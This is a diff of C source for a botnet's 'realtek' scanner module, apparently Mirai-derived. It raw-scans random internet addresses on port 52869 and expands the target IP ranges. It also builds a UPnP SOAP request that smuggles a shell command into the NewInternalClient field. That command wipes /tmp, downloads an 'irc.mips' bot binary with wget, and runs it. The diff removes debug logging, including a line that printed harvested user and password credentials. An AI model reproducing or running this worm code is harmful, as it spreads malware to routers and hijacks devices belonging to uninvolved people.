@@ -2,9 +2,7 @@
 
 #define _GNU_SOURCE
 
-#ifdef DEBUG
-    #include <stdio.h>
-#endif
+
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -16,8 +14,9 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 
 #include "includes.h"
 #include "realtek.h"
@@ -32,7 +31,7 @@ struct realtek_scanner_auth *realtek_auth_table = NULL;
 struct realtek_scanner_connection *conn_table;
 uint16_t realtek_realtek_auth_table_max_weight = 0;
 uint32_t realtek_fake_time = 0;
-int rtek[] = {180,190,191,210,200,153};
+int rtek[] = {180,190,191,210,200,153,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,175,176,177,178,179,181,182,183,184,185,186,187,188,189,192,193,194,195,196,197,198,199,201,202,203,211,212,213,217,218,219,220,221,222,223};
 
 int realtek_recv_strip_null(int sock, void *buf, int len, int flags)
 {
@@ -81,18 +80,14 @@ void realtek_scanner(void)
     // Set up raw socket scanning and payload
     if((realtek_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to initialize raw socket, cannot scan\n");
-        #endif
+        
         exit(0);
     }
     fcntl(realtek_rsck, F_SETFL, O_NONBLOCK | fcntl(realtek_rsck, F_GETFL, 0));
     i = 1;
     if(setsockopt(realtek_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to set IP_HDRINCL, cannot scan\n");
-        #endif
+        
         close(realtek_rsck);
         exit(0);
     }
@@ -121,9 +116,7 @@ void realtek_scanner(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    #ifdef DEBUG
-        printf("[scanner] scanner process initialized. scanning started.\n");
-    #endif
+    
 
     // Main logic loop
     while(TRUE)
@@ -148,12 +141,12 @@ void realtek_scanner(void)
                 iph->saddr = LOCAL_ADDR;
                 iph->daddr = get_random_realtek_ip();
                 iph->check = 0;
-                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
 
                 tcph->dest = htons(52869);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -231,9 +224,7 @@ void realtek_scanner(void)
 
             if(conn->state != REALTEK_SC_CLOSED && (realtek_fake_time - conn->last_recv) > timeout)
             {
-                #ifdef DEBUG
-                    printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
-                #endif
+                
 
                 close(conn->fd);
                 conn->fd = -1;
@@ -282,9 +273,7 @@ void realtek_scanner(void)
 
                     if(conn->state == REALTEK_SC_EXPLOIT_STAGE2)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d request sent to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
-                        #endif
+                        
 
                         // build stage 2 payload
                         util_strcpy(conn->payload_buf, "POST /picsdesc.xml HTTP/1.1\r\nContent-Length: 630\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf *; cd /tmp/; wget http://0.0.0.0/shitnet/irc.mips; chmod 777 irc.mips; ./irc.mips realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n");
@@ -318,9 +307,7 @@ void realtek_scanner(void)
                 }
                 else
                 {
-                    #ifdef DEBUG
-                        printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
-                    #endif
+                    
 
                     close(conn->fd);
                     conn->fd = -1;
@@ -350,9 +337,7 @@ void realtek_scanner(void)
                     ret = realtek_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, REALTEK_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                     if(ret == 0)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d connection gracefully closed (stage %d)\n", conn->fd, conn->state);
-                        #endif
+                        
                         errno = ECONNRESET;
                         ret = -1;
                     }
@@ -362,9 +347,7 @@ void realtek_scanner(void)
                         {
                             if(conn->state == REALTEK_SC_EXPLOIT_STAGE2)
                             {
-                                #ifdef DEBUG
-                                    printf("[scanner] FD%d resetting connection preparing to continue with stage 2 of the exploit\n", conn->fd);
-                                #endif
+                                
                                 close(conn->fd);
                                 realtek_setup_connection(conn);
                                 continue;
@@ -394,9 +377,7 @@ void realtek_scanner(void)
                         {
                             if(strstr(out, ""))
                             {
-                                #ifdef DEBUG
-                                    printf("[scanner] FD%d parsing credentials...\n", conn->fd);
-                                #endif
+                                
 
                                 memmove(out, out + 11, strlen(out));
 
@@ -419,9 +400,7 @@ void realtek_scanner(void)
 
                     if(conn->credentials[0] == NULL && conn->credentials[1] == NULL)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d failed to retrieve credentials\n", conn->fd);
-                        #endif
+                        
                         close(conn->fd);
                         conn->fd = -1;
                         conn->state = REALTEK_SC_CLOSED;
@@ -431,9 +410,7 @@ void realtek_scanner(void)
                     }
                     else
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d retrieved user: %s, pass: %s changing exploit stages\n", conn->fd, conn->credentials[0], conn->credentials[1]);
-                        #endif
+                        
 
                         close(conn->fd);
                         conn->fd = -1;
@@ -461,9 +438,7 @@ static void realtek_setup_connection(struct realtek_scanner_connection *conn)
 
     if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to call socket()\n");
-        #endif
+        
         return;
     }
 
@@ -524,5 +499,5 @@ static ipv4_t get_random_realtek_ip(void)
     return INET_ADDR(o1,o2,o3,o4);
 }
 
-#endif
 
+#endif
